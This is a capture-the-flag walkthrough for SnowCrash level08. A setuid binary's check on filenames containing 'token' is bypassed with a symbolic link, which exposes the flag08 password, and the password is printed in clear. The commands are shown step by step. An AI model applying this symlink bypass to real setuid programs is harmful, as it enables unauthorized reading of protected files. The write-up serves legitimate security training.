```bash
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$
```

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ echo "HI" > /tmp/file_to_read
level08@SnowCrash:~$ ./level08 /tmp/file_to_read
HI
level08@SnowCrash:~$ 
```

The `level08` program read any file that passed as the first argument. We simply need to read the `token` file from `/home/user/level08/`

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Using `https://dogbolt.org`, we can see that we need to modify the program's workflow to read the token file, while ensuring the filename does not contain `token`. One method is to use `ln` to create a symbolic link with a different name.


```bash
ln -s /home/user/level08/token /tmp/a
./level08 /tmp/a
```

```bash
su flag08
Password: quif5eloekouj29ke0vouxean
getflag
```
